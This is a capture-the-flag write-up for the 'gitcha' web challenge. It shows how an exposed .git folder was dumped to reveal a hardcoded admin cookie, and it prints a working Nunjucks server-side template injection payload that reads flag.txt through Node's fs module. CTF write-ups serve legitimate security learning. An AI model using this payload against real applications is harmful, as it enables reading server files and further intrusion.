# gitcha

## DESCRIPTION
>Simon is maintaining a personal portfolio website, along with a secret which no one else knows.  
> Can you discover his secret?  
> **FLAG FORMAT**:
dsc{[a-zA-Z0-9_]+}

## Solution
* On viewing the page source, we see a HTML comment about `.git` folder
* We are able to access the `.git` folder and view its contents
* Using [git-dumper](https://github.com/arthaud/git-dumper) download the `.git` folder.
* Check the commits  
`git log`

* commit `dcfb8e6db1b5d4bc80ab7af385fd6a80a7ce9561`
```javascript
app.get("/supersecret", (req, res) => {
-  if (req.cookies["SECRET_COOKIE_VALUE"] === "thisisahugesecret") {
-    res.send("You found the secret!");
}})
```
* To be an admin we should simply set this as the cookie:   
`SECRET_COOKIE_VALUE:thisisahugesecret`
* access `/supersecret`
* First thought was `SSTI`
* Testing with basic payload `{{7*7}}` evaluated to `49`, so our payload worked
* Next was to retrieve contents of `flag.txt`
* Found a payload on [HackTrickz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks)
### Payload
```txt
{{range.constructor("return global.process.mainModule.require('fs').readFileSync('flag.txt')")()}}
```  


* Adding this is a note and viewing the note gives us the flag
* Flag:   
`dsc{g1t_enum3r4ti0n_4nD_sSt1}`


## Resources:
* https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
* https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml
* [hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks)